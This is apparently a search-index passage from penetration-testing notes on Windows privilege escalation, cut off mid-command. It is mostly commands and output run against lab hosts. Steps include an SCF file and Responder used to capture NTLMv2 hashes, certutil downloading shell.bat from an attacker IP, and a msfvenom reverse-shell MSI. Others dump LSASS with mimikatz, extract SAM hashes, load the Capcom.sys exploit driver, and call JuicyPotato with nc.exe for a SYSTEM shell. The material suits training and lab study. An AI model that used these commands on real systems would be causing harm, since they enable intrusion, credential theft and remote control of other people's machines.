\n@{CommandLine=\u201cC:\\Windows\\system32\\backgroundTaskHost.exe\u201d -ServerName:CortanaUI.AppXy7vb4pc2... &lt;=\n</code></pre></p>  <p>SCF on a File Share</p> <p>A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. </p> <p>Create file, name it similar to another file, so it does not appear out of place. Put tun0 IP and any fake share name and .ico file name.</p> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.10.14.3\\share\\legit.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.</p> <pre><code>secops@kali[/kali]$ sudo responder -wrf -v -I tun0\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    DNS/MDNS                   [ON]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [ON]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n&lt;SNIP&gt;\n[+] Generic Options:\n    Responder NIC              [tun2]\n    Responder IP               [10.10.14.3]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP']\n\n[!] Error starting SSL server on port 443, check permissions or other servers running.\n[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.129.43.30\n[SMB] NTLMv2-SSP Username : WINLPE-SRV01\\Administrator\n[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...&lt;SNIP&gt;...\n</code></pre> <pre><code>secops@kali[/kali]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt\n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n&lt;SNIP&gt;\n</code></pre>","title":"Interacting with Users"},{"location":"privesc/windows/miscellaneous_techniques/","text":"<p>certutil.exe intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.</p> <pre><code>PS C:\\xyz&gt; certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat\n</code></pre> <p>We can use the <code>-encode</code> flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.</p> <pre><code>C:\\xyz&gt; certutil -encode file1 encodedfile\n\nInput Length = 7\nOutput Length = 70\nCertUtil: -encode command completed successfully\n</code></pre> <p>Once the new file has been created, we can use the <code>-decode</code> flag to decode the file back to its original contents. <pre><code>C:\\xyz&gt; certutil -decode encodedfile file2\n\nInput Length = 70\nOutput Length = 7\nCertUtil: -decode command completed successfully.\n</code></pre></p>  <p>Always Install Elevated</p> <p>This setting can be set via Local Group Policy by setting <code>Always install with elevated privileges</code> to <code>Enabled</code> under the following paths</p> <ul> <li><code>Computer Configuration\\Administrative Templates\\Windows Components\\Windows Installer</code></li> <li><code>User Configuration\\Administrative Templates\\Windows Components\\Windows Installer</code></li> </ul> <p>Enumerating Always Install Elevated Settings <pre><code>PS C:\\xyz&gt; reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n\nHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n</code></pre></p> <pre><code>PS C:\\xyz&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n</code></pre> <p><code>AlwaysInstallElevated</code> key exists, so the policy is indeed enabled on the target system.</p> <p>We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.</p> <pre><code>secops@kali[/kali]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of msi file: 159744 bytes\n</code></pre> <p>upload this MSI file to our target, start a listener and execute the file <pre><code>C:\\xyz&gt; msiexec /i c:\\users\\user\\desktop\\aie.msi /quiet /qn /norestart\n</code></pre></p> <p>we will receive a connection back as NT AUTHORITY\\SYSTEM <pre><code>secops@kali[/kali]$ nc -lnvp 9443\n\nlistening on [any] 9443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720\nMicrosoft Windows [Version 10.0.18363.592]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\n\nwhoami\nnt authority\\system\n</code></pre></p> <p>This issue can be mitigated by disabling the two Local Group Policy settings mentioned above.</p>  <p>Enumerating Scheduled Tasks</p> <p>We can use the schtasks command to enumerate scheduled tasks on the system.</p> <pre><code>C:\\xyz&gt;  schtasks /query /fo LIST /v\n\nFolder: \\\nINFO: There are no scheduled tasks presently available at your access level.\n\nFolder: \\Microsoft\nINFO: There are no scheduled tasks presently available at your access level.\n\nFolder: \\Microsoft\\Windows\nINFO: There are no scheduled tasks presently available at your access level.\n\nFolder: \\Microsoft\\Windows\\.NET Framework\nHostName:                             WINLPE-SRV01\nTaskName:                             \\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319\nNext Run Time:                        N/A\nStatus:                               Ready\nLogon Mode:                           Interactive/Background\nLast Run Time:                        5/27/2021 12:23:27 PM\nLast Result:                          0\nAuthor:                               N/A\nTask To Run:                          COM handler\n&lt;SNIP&gt;\n</code></pre> <p>PowerShell cmdlet for this: <pre><code>PS C:\\xyz&gt; Get-ScheduledTask | select TaskName,State\n\nTaskName                                                State\n--------                                                -----\n.NET Framework NGEN v4.0.30319                          Ready\n.NET Framework NGEN v4.0.30319 64                       Ready\n.NET Framework NGEN v4.0.30319 64 Critical           Disabled\n.NET Framework NGEN v4.0.30319 Critical              Disabled\nAD RMS Rights Policy Template Management (Automated) Disabled\nAD RMS Rights Policy Template Management (Manual)       Ready\nPolicyConverter                                      Disabled\nSmartScreenSpecific                                     Ready\nVerifiedPublisherCertStoreCheck                      Disabled\nMicrosoft Compatibility Appraiser                       Ready\nProgramDataUpdater                                      Ready\nStartupAppTask                                          Ready\nappuriverifierdaily                                     Ready\nappuriverifierinstall                                   Ready\nCleanupTemporaryState                                   Ready\nDsSvcCleanup                                            Ready\nPre-staged app cleanup                               Disabled\n\n&lt;SNIP&gt;\n</code></pre></p> <p>It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.</p> <p>Checking Permissions on C:\\Scripts Directory <pre><code>C:\\xyz&gt; .\\accesschk64.exe /accepteula -s -d C:\\Scripts\\\n\nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright \u2310 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nC:\\Scripts\n  RW BUILTIN\\Users\n  RW NT AUTHORITY\\SYSTEM\n  RW BUILTIN\\Administrators\n</code></pre></p>  <p>Checking Local User Description Field <pre><code>PS C:\\xyz&gt; Get-LocalUser\n\nName            Enabled Description\n----            ------- -----------\nAdministrator   True    Built-in account for administering the computer/domain\nDefaultAccount  False   A user account managed by the system.\nGuest           False   Built-in account for guest access to the computer/domain\nhelpdesk        True\nuser     True\nuser_adm True\njordan          True\nlogger          True\nsarah           True\nsccm_svc        True\nsecsvc          True    Network scanner - do not change password\nsql_dev         True\n</code></pre></p> <p>Enumerating Computer Description Field with Get-WmiObject Cmdlet <pre><code>PS C:\\xyz&gt; Get-WmiObject -Class Win32_OperatingSystem | select Description\n\nDescription\n-----------\nThe most vulnerable box ever!\n</code></pre></p>  <p>Mount VHDX/VMDK</p> <p>Snaffler</p> <p>If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.</p> <p>Mount VMDK on Linux <pre><code>secops@kali[/kali]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk\n</code></pre></p> <p>Mount VHD/VHDX on Linux <pre><code>secops@kali[/kali]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1\n</code></pre></p> <p>In Windows, we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.</p> <p>This guide illustrates many methods for gaining access to the files on a .vmdk file.</p> <p>Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the <code>C:\\Windows\\System32\\Config</code> directory and pull down the SAM, SECURITY and SYSTEM registry hives. We can then extract the password hashes for local users.</p> <pre><code>secops@kali[/kali]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL\n\nImpacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation\n\n[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\n\n&lt;SNIP&gt;\n</code></pre>","title":"Miscellaneous Techniques"},{"location":"privesc/windows/other_files/","text":"<p>Cheatsheet</p> <p>Search File Contents for String <pre><code>C:\\xyz&gt; cd c:\\Users\\user\\Documents &amp; findstr /SI /M \"password\" *.xml *.ini *.txt\n\nstuff.txt\n</code></pre></p> <p>Search File Contents for String <pre><code>C:\\xyz&gt; findstr /si password *.xml *.ini *.txt *.config\n\nstuff.txt:password: l-x9r11_2_GL!\n</code></pre></p> <p>Search File Contents for String <pre><code>C:\\xyz&gt; findstr /spin \"password\" *.*\n\nstuff.txt:1:password: l-x9r11_2_GL!\n</code></pre></p> <p>Search File Contents with PowerShell <pre><code>PS C:\\xyz&gt; select-string -Path C:\\Users\\user\\Documents\\*.txt -Pattern password\n\nstuff.txt:1:password: l-x9r11_2_GL!\n</code></pre></p> <p>Search for File Extensions <pre><code>C:\\xyz&gt; dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\n\nc:\\inetpub\\wwwroot\\web.config\n</code></pre></p> <p>Search for File Extensions <pre><code>C:\\xyz&gt; where /R C:\\ *.config\n\nc:\\inetpub\\wwwroot\\web.config\n</code></pre></p> <p>Search for File Extensions Using PowerShell <pre><code>PS C:\\xyz&gt; Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore\n\n\n    Directory: C:\\inetpub\\wwwroot\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         5/25/2021   9:59 AM            329 web.config\n\n&lt;SNIP&gt;\n</code></pre></p>  <p>Sticky Notes Passwords</p> <p>People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at <code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code> and is always worth searching for and examining.</p> <pre><code>PS C:\\xyz&gt; ls\n\n\n    Directory: C:\\Users\\user\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session\n-a----         5/25/2021  11:59 AM            982 Ecs.dat\n-a----         5/25/2021  11:59 AM           4096 plum.sqlite\n-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm\n-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal\n</code></pre> <p>Viewing Sticky Notes Data Using PowerShell: PSSQLite module</p> <pre><code>PS C:\\xyz&gt; Set-ExecutionPolicy Bypass -Scope Process\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose\nyou to the security risks described in the about_Execution_Policies help topic at\nhttps:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?\n[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is \"N\"): A\n\nPS C:\\xyz&gt; cd .\\PSSQLite\\\nPS C:\\xyz&gt; Import-Module .\\PSSQLite.psd1\nPS C:\\xyz&gt; $db = 'C:\\Users\\user\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite'\nPS C:\\xyz&gt; Invoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | ft -wrap\n\nText\n----\n\\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter\n\\id=e4adae4c-a40b-48b4-93a5-900247852f96\n\\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!\n\\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am\n</code></pre> <p>Strings to View DB File Contents</p> <pre><code>secops@kali[/kali]$  strings plum.sqlite-wal\n\nCREATE TABLE \"Note\" (\n\"Text\" varchar ,\n\"WindowPosition\" varchar ,\n\"IsOpen\" integer ,\n\"IsAlwaysOnTop\" integer ,\n\"CreationNoteIdAnchor\" varchar ,\n\"Theme\" varchar ,\n\"IsFutureNote\" integer ,\n\"RemoteId\" varchar ,\n\"ChangeKey\" varchar ,\n\"LastServerVersion\" varchar ,\n\"RemoteSchemaVersion\" integer ,\n\"IsRemoteDataInvalid\" integer ,\n\"PendingInsightsScan\" integer ,\n\"Type\" varchar ,\n\"Id\" varchar primary key not null ,\n\"ParentId\" varchar ,\n\"CreatedAt\" bigint ,\n\"DeletedAt\" bigint ,\n\"UpdatedAt\" bigint )'\nindexsqlite_autoindex_Note_1Note\naf907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c\nU   af907b1b-1eef-4d29-b238-3ea74f7ffe5c\nYellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c\nU   93b49900-6530-42e0-b35c-2663989ae4b3\n\n\n&lt; SNIP &gt;\n\n\\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter\n\\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*\n\\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c\n\n&lt;SNIP &gt;\n</code></pre>  <p>Other Files of Interest <pre><code>%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows PowerShell\\*\n</code></pre></p>","title":"Other Files"},{"location":"privesc/windows/print_operators/","text":"<p>Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command whoami /priv, and don't see the SeLoadDriverPrivilege from an unelevated context, we will need to bypass UAC.</p> <pre><code>C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name           Description                          State\n======================== =================================    =======\nSeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled\nSeChangeNotifyPrivilege  Bypass traverse checking             Enabled\nSeShutdownPrivilege      Shut down the system                 Disabled\n</code></pre> <p>The UACMe repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, SeLoadDriverPrivilege is visible but disabled.</p> <pre><code>C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================  ==========\nSeMachineAccountPrivilege     Add workstations to domain           Disabled\nSeLoadDriverPrivilege         Load and unload device drivers       Disabled\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\n</code></pre> <p>The driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use this tool to load the driver. The PoC enables the privilege as well as loads the driver for us.</p> <p>Download it locally and edit it, pasting over the includes below.</p> <pre><code>include &lt;windows.h&gt;\ninclude &lt;assert.h&gt;\ninclude &lt;winternl.h&gt;\ninclude &lt;sddl.h&gt;\ninclude &lt;stdio.h&gt;\ninclude \"tchar.h\"\n</code></pre> <p>From a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe.</p> <pre><code>C:\\Users\\&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp\n\nMicrosoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\nEnableSeLoadDriverPrivilege.cpp\nMicrosoft (R) Incremental Linker Version 14.28.29913.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n/out:EnableSeLoadDriverPrivilege.exe\nEnableSeLoadDriverPrivilege.obj\n</code></pre> <p>Download the Capcom.sys driver from here, and save it to C:\\temp. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.</p> <pre><code>C:\\xyz&gt; reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\n\nThe operation completed successfully.\n\n\nC:\\xyz&gt; reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n\nThe operation completed successfully.\n</code></pre> <p>Using Nirsoft's DriverView.exe, we can verify that the Capcom.sys driver is not loaded.</p> <pre><code>PS C:\\xyz&gt; .\\DriverView.exe /stext drivers.txt\nPS C:\\xyz&gt; cat drivers.txt | Select-String -pattern Capcom\n</code></pre> <p>Run the EnableSeLoadDriverPrivilege.exe binary. <pre><code>C:\\xyz&gt; EnableSeLoadDriverPrivilege.exe\n\nwhoami:\nLEGALCORP0\\printsvc\n\nwhoami /priv\nSeMachineAccountPrivilege        Disabled\nSeLoadDriverPrivilege            Enabled\nSeShutdownPrivilege              Disabled\nSeChangeNotifyPrivilege          Enabled by default\nSeIncreaseWorkingSetPrivilege    Disabled\nNTSTATUS: 00000000, WinError: 0\n</code></pre></p> <p>Verify that the Capcom driver is now listed. <pre><code>PS C:\\xyz&gt; .\\DriverView.exe /stext drivers.txt\nPS C:\\xyz&gt; cat drivers.txt | Select-String -pattern Capcom\n\nDriver Name           : Capcom.sys\nFilename              : C:\\Tools\\Capcom.sys\n</code></pre></p> <p>To exploit the Capcom.sys, we can use the ExploitCapcom tool after compiling with it Visual Studio.</p> <pre><code>PS C:\\xyz&gt; .\\ExploitCapcom.exe\n\n[*] Capcom.sys exploit\n[*] Capcom.sys handle was obained as 0000000000000070\n[*] Shellcode was placed at 0000024822A50008\n[+] Shellcode was executed\n[+] Token stealing was successful\n[+] The SYSTEM shell was launched\n</code></pre> <p>This launches a shell with SYSTEM privileges.</p>  <p>We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver:</p> <pre><code>C:\\xyz&gt; EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys\n\n[+] Enabling SeLoadDriverPrivilege\n[+] SeLoadDriverPrivilege Enabled\n[+] Loading Driver: \\Registry\\User\\S-1-5-21-454284637-3659702366-2958135535-1103\\System\\CurrentControlSet\\Capcom\nNTSTATUS: c000010e, WinError: 0\n</code></pre> <p>We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.</p>   <p>Note: Since Windows 10 Version 1803, the \"SeLoadDriverPrivilege\" is not exploitable, as it is no longer possible to include references to registry keys under \"HKEY_CURRENT_USER\".</p>","title":"Print Operators"},{"location":"privesc/windows/sebugpriv/","text":"<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.</p> <p>This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.</p> <p>After logging on as a user assigned the Debug programs right and opening an elevated shell, we see SeDebugPrivilege is listed.</p> <pre><code>C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== ========\nSeDebugPrivilege                          Debug programs                                                     Disabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled\n</code></pre> <p>We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.</p> <pre><code>C:\\xyz&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\nProcDump v10.0 - Sysinternals process dump utility\nCopyright (C) 2009-2020 Mark Russinovich and Andrew Richards\nSysinternals - www.sysinternals.com\n\n[15:25:45] Dump 1 initiated: C:\\Tools\\Procdump\\lsass.dmp\n[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.\n[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds\n[15:25:46] Dump count reached.\n</code></pre> <p>Load this in Mimikatz using the sekurlsa::minidump command. After issuing the sekurlsa::logonPasswords commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).</p> <pre><code>C:\\xyz&gt; mimikatz.exe\n\n  ..   mimikatz 2.2.0 (x64) 19041 Sep 18 2020 19:18:29\n . ^ .  \"A La Vie, A L'Amour\" - (oe.eo)\n  / \\   /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n  \\ /        &gt; https://blog.gentilkiwi.com/mimikatz\n ' v '       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  ''        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz  log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz  sekurlsa::minidump lsass.dmp\nSwitch to MINIDUMP : 'lsass.dmp'\n\nmimikatz  sekurlsa::logonpasswords\nOpening : 'lsass.dmp' file for minidump...\n\nAuthentication Id : 0 ; 23196355 (00000000:0161f2c3)\nSession           : Interactive from 4\nUser Name         : DWM-4\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 3/31/2021 3:00:57 PM\nSID               : S-1-5-90-0-4\n        msv :\n        tspkg :\n        wdigest :\n         * Username : WINLPE-SRV01$\n         * Domain   : WORKGROUP\n         * Password : (null)\n        kerberos :\n        ssp :\n        credman :\n\n&lt;SNIP&gt; \n\nAuthentication Id : 0 ; 23026942 (00000000:015f5cfe)\nSession           : RemoteInteractive from 2\nUser Name         : jordan\nDomain            : WINLPE-SRV01\nLogon Server      : WINLPE-SRV01\nLogon Time        : 3/31/2021 2:59:52 PM\nSID               : S-1-5-21-3769161915-3336846931-3985975925-1000\n        msv :\n         [00000003] Primary\n         * Username : jordan\n         * Domain   : WINLPE-SRV01\n         * NTLM     : cf3a5525ee9414229e66279623ed5c58\n         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2\n        tspkg :\n        wdigest :\n         * Username : jordan\n         * Domain   : WINLPE-SRV01\n         * Password : (null)\n        kerberos :\n         * Username : jordan\n         * Domain   : WINLPE-SRV01\n         * Password : (null)\n        ssp :\n        credman :\n\n&lt;SNIP&gt;\n</code></pre> <p>If unable to load tools on the target but have RDP Access, we can take a manual memory dump of the LSASS process via the Task Manager.</p>","title":"SeDebugPrivilege"},{"location":"privesc/windows/seimpersonate_seassignprimarytoken/","text":"<p>SeImpersonate Example - JuicyPotato</p> <pre><code>secops@kali[/kali]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth\n\nImpacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed database context to 'master'.\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) \n[!] Press help for extra shell commands\nSQL&gt;\n</code></pre> <pre><code>SQL&gt; enable_xp_cmdshell\n\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install\n</code></pre> <pre><code>SQL&gt; xp_cmdshell whoami\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nnt service\\mssql$sqlexpress01\n</code></pre> <p>Checking Account Privileges</p> <pre><code>SQL&gt; xp_cmdshell whoami /priv\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nPRIVILEGES INFORMATION                                                             \n\n----------------------                                                             \nPrivilege Name                Description                               State      \n\n============================= ========================================= ========   \n\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   \nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   \nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    \nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled    \nSeCreateGlobalPrivilege       Create global objects                     Enabled    \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   \n</code></pre> <p>whoami /priv confirms that SeImpersonatePrivilege is listed. This privilege can be used to impersonate a privileged account such as NT AUTHORITY\\SYSTEM. JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.</p>  <p>Escalating Privileges using JuicyPotato</p> <pre><code>SQL&gt; xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nTesting {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               \n\n[+] authresult 0                                                                   \n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM                                                                                                    \n[+] CreateProcessWithTokenW OK                                                     \n[+] calling 0x000000000088ce08\n</code></pre> <p>Catching Shell</p> <pre><code>secops@kali[/kali]$ sudo nc -lnvp 8443\n\nlistening on [any] 8443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\n\nC:\\Windows\\system32&gt;whoami\n\nwhoami\nnt authority\\system\n\n\nC:\\Windows\\system32&gt;hostname\n\nhostname\nWINLPE-SRV01\n</code></pre>  <p>PrintSpoofer and RoguePotato</p> <p>JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\\SYSTEM level access.</p> <p>Escalating Privileges using PrintSpoofer</p> <p>We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell.</p> <pre><code>SQL&gt; xp_cmdshell c:\\tools\\PrintSpoofer.exe -c 